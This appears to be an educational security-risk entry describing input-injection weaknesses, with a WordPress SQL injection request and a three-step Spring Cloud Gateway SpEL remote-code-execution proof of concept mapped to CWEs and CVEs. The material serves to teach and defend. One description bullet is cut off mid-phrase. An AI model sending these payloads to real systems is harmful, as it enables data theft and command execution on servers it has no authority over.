# Input Parameter Hijacking

## Overview

In complex applications, business actions often translate into technical operations - evaluating expressions, constructing
queries, formatting outputs, or invoking system commands.

When untrusted input flows into these operations without strict
validation or context checks, attackers can manipulate core processes, execute arbitrary code, or extract confidential data,
undermining both functional integrity and security at the business-logic level.

## Description

These weaknesses stem from failing to isolate user input from sensitive operations, enabling exploits such as:

* **Unsafe Expression Handling:** Allowing dynamic expressions (e.g., OGNL or SpEL) to be parsed and executed leads to remote
code execution when user-controlled data is treated as executable logic.

* **Insecure Deserialization:** Feeding attacker-crafted serialized payloads into deserialization routines within REST endpoints
can trigger execution of arbitrary code.

* **Improper Query Construction:** Embedding unchecked input directly into SQL or JSON-based queries without parameterization
permits attackers to alter or extract data illicitly.

* **Unsanitized Output:** Including raw user data in API responses or templates without neutralizing special characters
can enable cross-site scripting or other injection attacks when that data is rendered client-side.

* **Command Invocation Flaws:** Concatenating user input into OS command strings and executing them exposes systems to command
injection, letting attackers execute arbitrary shell commands.

* **Unexpected values:** Feeding attacker-crafted serialized payloads

## Examples

### Scenario #1: SQL Injection in Wordpress

The `order` parameter in a comment-retrieval endpoint was directly embedded in SQL without sanitization. This allows attackers
to extract sensitive database fields unauthenticated using SQL queries injected through the order parameter.

The attack is reproducible with a simple API call:
```
GET /wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT user_login FROM wp_users)&postid=1
```

### Scenario #2: RCE via SpEL expressions

Exposed and unsecured Actuator routes endpoint allowed SpEL expressions in route definitions. This enables attackers to
inject arbitrary OS commands via SpEL, compromising microservices:

1. Inject malicious route
```shell
POST /actuator/gateway/routes/test HTTP/1.1
{
    "id":"test",
    "filters": [
        {
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"
            }
        }
    ]
}
```

2. Refresh routes to execute SpEL:
```shell
POST /actuator/gateway/refresh
```

3. Retrieve execution result:
```shell
GET /actuator/gateway/routes/test
```

## Mapped CWEs
- CWE-94
- CWE-913
- CWE-74
- CWE-78

## Sample CVEs
- CVE-2022-26134
- CVE-2022-22947
- CVE-2017-9805
- CVE-2024-8484